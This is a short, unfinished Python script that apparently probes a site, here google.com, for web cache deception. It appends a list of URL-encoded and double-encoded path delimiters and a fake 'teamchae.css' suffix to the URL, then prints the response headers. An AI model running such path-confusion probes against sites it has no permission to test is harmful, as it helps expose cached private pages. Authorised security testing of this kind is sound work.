import requests 
LOGS = "logs.txt"

lst = [
  "google.com"
]

attack_lst = [
  r"/",
  r"%0A",
  r"%3Fname=",
  r"%3B",
  r"%23",
  r"%2F",
  r"%25%30%41",
  r"%25%30%30",
  r"%25%33%46",
  r"%25%33%42",
  r"%25%32%33",
  r"%25%32%46",
  r"%40",
  r"%25%34%30",
  r"%5C",
  r"%25%35%43",
  r"%3A",
  r"%25%33%41"
]

attack_string = "teamchae.css"

## Get stuff
for url_ in lst:
  url_ = "http://" + url_
  print("[i] testing for", url_)
  r1 = requests.get(url_)
  r2 = requests.get(url_)

  if r1.content == r2.content:
    print("[!] static page detected, abort test!")
  else:
    ## step 2
    ## add attack url
    print("[!] step 1 passed (dynamic page), moving on to step 2...")
    for suffix in attack_lst:
      # remove last "/"
      attack_url = url_ + suffix + attack_string
      
      a1 = requests.get(attack_url)
      a2 = requests.get(attack_url)

      h1 = a1.headers
      h2 = a2.headers

      print(h1)

      exit()
